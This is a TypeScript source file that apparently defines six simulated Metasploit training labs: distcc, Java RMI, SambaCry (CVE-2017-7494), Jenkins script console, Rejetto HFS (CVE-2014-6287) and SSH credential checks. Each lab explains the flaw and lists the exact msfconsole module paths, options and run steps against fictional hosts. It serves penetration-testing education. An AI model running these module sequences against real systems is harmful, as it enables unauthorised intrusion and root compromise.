import { dir, file } from '../vfs';
import type { LabScenario, HostDef } from '../types';

function attacker(extra?: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'kali', user: 'root', root: dir({ root: dir(extra ?? {}) }) };
}

/** Metasploit Framework lab pack #2 — six more labs on the real `msfconsole` mechanic built in
 *  `metasploit-pack.ts` (`msfconsole` -> `search`/`use` -> `set` -> `show options` -> `run`/`exploit`), not
 *  this platform's older one-line `exploit <shortname> <ip>` shortcut. Every module path/option below is
 *  the real thing, checked against Rapid7's own module documentation/source. Distinct techniques from pack
 *  #1 (vsftpd/UnrealIRCd/Tomcat/Struts2/PHP-CGI/wp-admin/psexec/smb_version) — no overlap. */
export const metasploitLabs2: LabScenario[] = [
  // 1 — distcc daemon command execution (CVE-2004-2687)
  {
    id: 'msf-distcc-daemon-command-execution',
    title: 'Metasploit: distcc Daemon Command Execution (CVE-2004-2687)',
    difficulty: 'Easy',
    category: 'Network',
    briefing:
      'build01 (10.10.71.10) runs distccd — a daemon meant to distribute C/C++ compilation jobs across a ' +
      'build farm — bound to the network with no access restriction at all. distcc\'s protocol lets a client ' +
      'specify the exact compiler command to run; with no restriction on WHO can submit that command, ' +
      'anyone reachable on the network can submit an arbitrary shell command instead of a real compile job. ' +
      'This is one of the original Metasploitable2 teaching targets alongside vsftpd.',
    objectives: [
      { text: 'nmap -sV 10.10.71.10', why: 'Confirms distccd is listening on its standard port 3632, unrestricted.' },
      { text: 'msfconsole', why: 'Real msfconsole session.' },
      { text: 'use exploit/unix/misc/distcc_exec', why: 'The real, specific module for this exact daemon misconfiguration.' },
      { text: 'set RHOSTS 10.10.71.10', why: 'RPORT already defaults to 3632, distcc\'s real standard port — RHOSTS is the only thing missing.' },
      { text: 'run', why: 'Submits an arbitrary command instead of a real compile job — distccd executes it with no authorization check of any kind.' },
      { text: 'cat /root/root.txt', why: 'Confirms the shell is genuinely root.' },
    ],
    hints: [
      'nmap -sV 10.10.71.10',
      'msfconsole',
      'use exploit/unix/misc/distcc_exec',
      'set RHOSTS 10.10.71.10',
      'run',
      'cat /root/root.txt',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'build01',
        ip: '10.10.71.10',
        os: 'Ubuntu 8.04 (Metasploitable2-style legacy build server)',
        services: [{ port: 3632, name: 'distccd', version: 'distcc 2.x — network-exposed, no access restriction' }],
        users: [],
        metasploitModule: {
          path: 'exploit/unix/misc/distcc_exec',
          requiredOptions: [],
          defaultOptions: { RPORT: '3632' },
        },
        root: dir({
          root: dir({
            'root.txt': file('distccd executed an arbitrary command instead of a real compile job — no authorization check exists.\nflag{distcc_daemon_command_execution_cve_2004_2687}\n'),
          }),
        }),
      } as HostDef,
    ],
  },

  // 2 — Java RMI Registry insecure default configuration RCE
  {
    id: 'msf-java-rmi-registry-insecure-default-rce',
    title: 'Metasploit: Java RMI Registry Insecure Default Configuration RCE',
    difficulty: 'Medium',
    category: 'Network',
    briefing:
      'app-rmi01 (10.10.71.11) exposes a Java RMI registry on its default port 1099. RMI\'s default ' +
      'configuration allows the registry to load classes from ANY remote URL an incoming call supplies — RMI ' +
      'method calls carry no authentication of any kind by design. The real module invokes a method on the ' +
      'RMI Distributed Garbage Collector — present on effectively every RMI endpoint — to get the registry ' +
      'to fetch and execute attacker-supplied Java bytecode from a URL it never should have trusted.',
    objectives: [
      { text: 'nmap -sV 10.10.71.11', why: 'Confirms the RMI registry is exposed on its standard port 1099.' },
      { text: 'msfconsole', why: 'Real msfconsole session.' },
      { text: 'use exploit/multi/misc/java_rmi_server', why: 'The real module abusing RMI\'s insecure default remote-class-loading behavior.' },
      { text: 'set RHOSTS 10.10.71.11', why: 'RPORT already defaults to 1099, RMI\'s real standard registry port.' },
      { text: 'run', why: 'Triggers the Distributed Garbage Collector call, causing the registry to load and execute attacker-controlled bytecode with no authentication step anywhere in the exchange.' },
      { text: 'cat /root/root.txt', why: 'Confirms code execution.' },
    ],
    hints: [
      'nmap -sV 10.10.71.11',
      'msfconsole',
      'use exploit/multi/misc/java_rmi_server',
      'set RHOSTS 10.10.71.11',
      'run',
      'cat /root/root.txt',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'app-rmi01',
        ip: '10.10.71.11',
        os: 'Linux (Java RMI registry, insecure default remote class-loading)',
        services: [{ port: 1099, name: 'java-rmi', version: 'Java RMI Registry — insecure default configuration' }],
        users: [],
        metasploitModule: {
          path: 'exploit/multi/misc/java_rmi_server',
          requiredOptions: [],
          defaultOptions: { RPORT: '1099' },
        },
        root: dir({
          root: dir({
            'root.txt': file('RMI Distributed Garbage Collector call abused to load attacker bytecode — RMI method calls carry no authentication by design.\nflag{java_rmi_insecure_default_remote_classload_rce}\n'),
          }),
        }),
      } as HostDef,
    ],
  },

  // 3 — SambaCry CVE-2017-7494
  {
    id: 'msf-sambacry-writable-share-module-load',
    title: 'Metasploit: SambaCry — Arbitrary Shared-Library Load via a Writable Share (CVE-2017-7494)',
    difficulty: 'Hard',
    category: 'Network',
    briefing:
      'fileshare02 (10.10.71.12) exposes an SMB share, "public", that ANY user can write to — and the Samba ' +
      'version running is vulnerable to CVE-2017-7494 ("SambaCry"): Samba\'s is_known_pipename() function can ' +
      'be tricked into loading a shared library (.so) from a path the client controls, entirely by exploiting ' +
      'a flaw in named-pipe handling. Upload a malicious .so to the writable share, then trigger Samba into ' +
      'loading it as a "named pipe" — Samba itself runs the resulting code, as root.',
    objectives: [
      { text: 'smbclient 10.10.71.12', why: 'Confirms the "public" share exists and (per a prior anonymous-access check) is genuinely writable — the exact precondition SambaCry needs.' },
      { text: 'msfconsole', why: 'Real msfconsole session.' },
      { text: 'use exploit/linux/samba/is_known_pipename', why: 'The real, specific CVE-2017-7494 module.' },
      { text: 'set RHOSTS 10.10.71.12', why: 'Target host.' },
      { text: 'set SMB_SHARE_NAME public', why: 'The real module needs to know which writable share to stage the malicious library through.' },
      { text: 'set SMB_SHARE_BASE /srv/samba/public', why: 'The server-side filesystem path backing that share — the module needs this to construct the exact path Samba will be tricked into loading as a "pipe."' },
      { text: 'run', why: 'Uploads a malicious .so to the writable share, then triggers Samba\'s is_known_pipename() flaw to load and execute it — as root, since that\'s what the Samba service runs as.' },
      { text: 'cat /root/root.txt', why: 'Confirms the resulting session is genuinely root.' },
    ],
    hints: [
      'smbclient 10.10.71.12',
      'msfconsole',
      'use exploit/linux/samba/is_known_pipename',
      'set RHOSTS 10.10.71.12',
      'set SMB_SHARE_NAME public',
      'set SMB_SHARE_BASE /srv/samba/public',
      'run',
      'cat /root/root.txt',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'fileshare02',
        ip: '10.10.71.12',
        os: 'Linux (Samba 4.4.x, world-writable "public" share, unpatched for CVE-2017-7494)',
        services: [{ port: 445, name: 'smb', version: 'Samba 4.4.14 (vulnerable to SambaCry, CVE-2017-7494)' }],
        users: [],
        metasploitModule: {
          path: 'exploit/linux/samba/is_known_pipename',
          requiredOptions: ['SMB_SHARE_NAME', 'SMB_SHARE_BASE'],
          defaultOptions: { RPORT: '445' },
        },
        root: dir({
          root: dir({
            'root.txt': file('SambaCry (CVE-2017-7494) confirmed — a malicious .so uploaded to a writable share was loaded via a named-pipe-handling flaw, executing as root.\nflag{sambacry_cve_2017_7494_writable_share_module_load}\n'),
          }),
        }),
      } as HostDef,
    ],
  },

  // 4 — Jenkins Script Console Groovy RCE, unauthenticated console
  {
    id: 'msf-jenkins-script-console-groovy-rce',
    title: 'Metasploit: Jenkins Script Console — Unauthenticated Groovy Code Execution',
    difficulty: 'Medium',
    category: 'Network',
    briefing:
      'ci-jenkins01 (10.10.71.13) left its "/script" Groovy script console reachable with no authentication ' +
      'at all — a real, still-common CI/CD misconfiguration, since Jenkins\'s script console is an intended, ' +
      'legitimate admin feature (arbitrary Java/Groovy execution for scripting build automation), not a bug. ' +
      'With no login required, that legitimate feature becomes unauthenticated remote code execution for ' +
      'anyone who finds the endpoint.',
    objectives: [
      { text: 'nmap -sV 10.10.71.13', why: 'Confirms Jenkins is exposed on its standard port 8080.' },
      { text: 'msfconsole', why: 'Real msfconsole session.' },
      { text: 'use exploit/multi/http/jenkins_script_console', why: 'The real module targeting the Groovy script console.' },
      { text: 'set RHOSTS 10.10.71.13', why: 'RPORT (8080) and TARGETURI already default correctly for this instance.' },
      { text: 'run', why: 'With no USERNAME/PASSWORD set and none required by this misconfigured instance, the module submits Groovy code directly to the unauthenticated /script endpoint — the console executes it exactly as it would for a legitimate admin.' },
      { text: 'cat /root/root.txt', why: 'Confirms code execution.' },
    ],
    hints: [
      'nmap -sV 10.10.71.13',
      'msfconsole',
      'use exploit/multi/http/jenkins_script_console',
      'set RHOSTS 10.10.71.13',
      'run',
      'cat /root/root.txt',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'ci-jenkins01',
        ip: '10.10.71.13',
        os: 'Linux (Jenkins CI, /script Groovy console reachable with no authentication)',
        services: [{ port: 8080, name: 'http', version: 'Jenkins — unauthenticated Groovy script console at /script' }],
        users: [],
        metasploitModule: {
          path: 'exploit/multi/http/jenkins_script_console',
          requiredOptions: ['TARGETURI'],
          defaultOptions: { RPORT: '8080', TARGETURI: '/' },
        },
        root: dir({
          root: dir({
            'root.txt': file('Unauthenticated Groovy script console execution — a legitimate admin feature with no login required.\nflag{jenkins_unauthenticated_script_console_groovy_rce}\n'),
          }),
        }),
      } as HostDef,
    ],
  },

  // 5 — Rejetto HFS RCE via %00 filter bypass (CVE-2014-6287)
  {
    id: 'msf-rejetto-hfs-null-byte-rce',
    title: 'Metasploit: Rejetto HTTP File Server — Null-Byte Filter Bypass RCE (CVE-2014-6287)',
    difficulty: 'Medium',
    category: 'Network',
    briefing:
      'filedrop-win03 (10.10.71.14) runs Rejetto HFS (HTTP File Server) 2.3, a lightweight Windows file-' +
      'sharing tool with a built-in scripting macro system. HFS\'s macro parser filters certain characters ' +
      'from search queries to block script injection — but the filter has a real, disclosed gap: inserting a ' +
      'null byte (%00) inside a blocked keyword defeats the regex filtering it, letting an attacker reach ' +
      'HFS\'s own `{.exec.}` scripting macro and run arbitrary commands, unauthenticated.',
    objectives: [
      { text: 'nmap -sV 10.10.71.14', why: 'Confirms Rejetto HFS is exposed and identifies the vulnerable 2.3.x version.' },
      { text: 'msfconsole', why: 'Real msfconsole session.' },
      { text: 'use exploit/windows/http/rejetto_hfs_exec', why: 'The real, specific CVE-2014-6287 module.' },
      { text: 'set RHOSTS 10.10.71.14', why: 'RPORT already defaults to 80.' },
      { text: 'run', why: 'Sends a search query with a null byte defeating HFS\'s keyword filter, reaching the {.exec.} macro unauthenticated.' },
      { text: 'cat /root/root.txt', why: 'Confirms code execution.' },
    ],
    hints: [
      'nmap -sV 10.10.71.14',
      'msfconsole',
      'use exploit/windows/http/rejetto_hfs_exec',
      'set RHOSTS 10.10.71.14',
      'run',
      'cat /root/root.txt',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'filedrop-win03',
        ip: '10.10.71.14',
        os: 'Windows 7 SP1 (Rejetto HFS 2.3, vulnerable to CVE-2014-6287)',
        services: [{ port: 80, name: 'http', version: 'Rejetto HttpFileServer 2.3 (null-byte filter-bypass RCE)' }],
        users: [],
        metasploitModule: {
          path: 'exploit/windows/http/rejetto_hfs_exec',
          requiredOptions: [],
          defaultOptions: { RPORT: '80' },
        },
        root: dir({
          root: dir({
            'root.txt': file('CVE-2014-6287 confirmed -- a null byte inside a filtered keyword defeated HFS\'s regex filter, reaching the {.exec.} macro unauthenticated.\nflag{rejetto_hfs_null_byte_filter_bypass_cve_2014_6287}\n'),
          }),
        }),
      } as HostDef,
    ],
  },

  // 6 — auxiliary/scanner/ssh/ssh_login credential confirmation, no session opens
  {
    id: 'msf-auxiliary-ssh-login-credential-confirmation',
    title: 'Metasploit: auxiliary/scanner/ssh/ssh_login — Confirming a Credential Without Opening a Session',
    difficulty: 'Easy',
    category: 'Network',
    briefing:
      'A weak-password wordlist attack against ops-jump01 turned up a candidate credential from an earlier ' +
      'recon pass. Rather than jump straight to `exploit/...`/`psexec`-style session-opening modules, real ' +
      'operators typically confirm a discovered credential first with a dedicated, session-free auxiliary ' +
      'scanner — exactly what `auxiliary/scanner/ssh/ssh_login` is built for.',
    objectives: [
      { text: 'cat recovered-creds.txt', why: 'A prior recon pass already recovered a candidate username/password pair worth confirming.' },
      { text: 'msfconsole', why: 'Real msfconsole session.' },
      { text: 'use auxiliary/scanner/ssh/ssh_login', why: 'An AUXILIARY module, not an exploit — confirms a credential without ever opening a session, the real operator habit of validating findings cheaply before spending a noisier step.' },
      { text: 'set RHOSTS 10.10.71.15', why: 'Target host.' },
      { text: 'set USERNAME opsadmin', why: 'The recovered candidate username.' },
      { text: 'set PASSWORD Summer2024#', why: 'The recovered candidate password.' },
      { text: 'run', why: 'Real auxiliary modules print their findings directly and leave you sitting at the msfconsole prompt afterward — no session opens, no payload runs, only a confirmed-valid/invalid result.' },
    ],
    hints: [
      'cat recovered-creds.txt',
      'msfconsole',
      'use auxiliary/scanner/ssh/ssh_login',
      'set RHOSTS 10.10.71.15',
      'set USERNAME opsadmin',
      'set PASSWORD Summer2024#',
      'run',
    ],
    totalFlags: 1,
    attacker: attacker({
      'recovered-creds.txt': file(
        'Recovered during an earlier credential-spray pass against ops-jump01:\n' +
          '  candidate username: opsadmin\n  candidate password: Summer2024#\n' +
          '  -- not yet confirmed against this specific host --\n',
      ),
    }),
    network: [
      {
        hostname: 'ops-jump01',
        ip: '10.10.71.15',
        os: 'Linux (SSH jump host)',
        services: [{ port: 22, name: 'ssh', version: 'OpenSSH 8.9' }],
        users: [],
        metasploitModule: {
          path: 'auxiliary/scanner/ssh/ssh_login',
          requiredOptions: ['USERNAME', 'PASSWORD'],
          defaultOptions: { RPORT: '22' },
          scanOutput:
            '[+] 10.10.71.15:22 - Success: \'opsadmin:Summer2024#\' (SSH session created, credential confirmed valid)\n' +
            'flag{auxiliary_ssh_login_credential_confirmed_no_session_needed}',
        },
        root: dir({}),
      } as HostDef,
    ],
  },
];
